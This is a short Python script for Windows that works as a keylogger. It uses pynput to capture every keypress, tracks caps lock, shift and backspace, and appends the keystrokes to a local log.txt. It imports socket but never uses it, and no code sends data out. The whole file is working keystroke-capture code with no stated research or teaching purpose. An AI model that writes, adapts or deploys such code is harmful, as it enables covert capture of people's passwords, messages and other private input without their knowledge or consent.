# coding: utf-8
# python 3.6.8 x86_64

import socket
import sys
import string
from win32api import GetKeyState
from win32con import VK_CAPITAL
from pynput.keyboard import Key, Listener, KeyCode

flags = {
    "backspace": 0,
    "caps_lock": False,
    "last_key": None
}

if GetKeyState(VK_CAPITAL):
    flags["caps_lock"] = True

except_key = [Key.esc, Key.backspace, Key.space, Key.caps_lock]
shift_key = [Key.shift_r, Key.shift_l, Key.shift]
alphabet = string.printable+ "éèàç²"

def on_press(key):
    with open("log.txt",  mode="a+") as fp:
        if key == Key.enter:
            fp.write("\n")
        elif key == Key.space:
            fp.write(" ")
        # elif key == Key.esc:
        #     return False
        elif key == Key.caps_lock:
            if flags["caps_lock"]:
                flags["caps_lock"] = False
            else:
                flags["caps_lock"] = True
        elif str(key)[1:-1] in alphabet:
            if flags["backspace"] > 0:
                fp.write(f":({flags['backspace']}*backspace)")
                flags["backspace"] = 0
            if flags["caps_lock"]:
                fp.write(str(key)[1:-1].upper())
            elif flags["last_key"] in shift_key:
                fp.write(str(key)[1:-1].upper())
            else:
                fp.write(str(key)[1:-1])
        elif key == Key.backspace:
            flags["backspace"] += 1
        elif key in Key and key not in except_key:
            fp.write(f"{str(key)}+ ")
        flags["last_key"] = key


with Listener(on_press=on_press) as listener:
    listener.join()
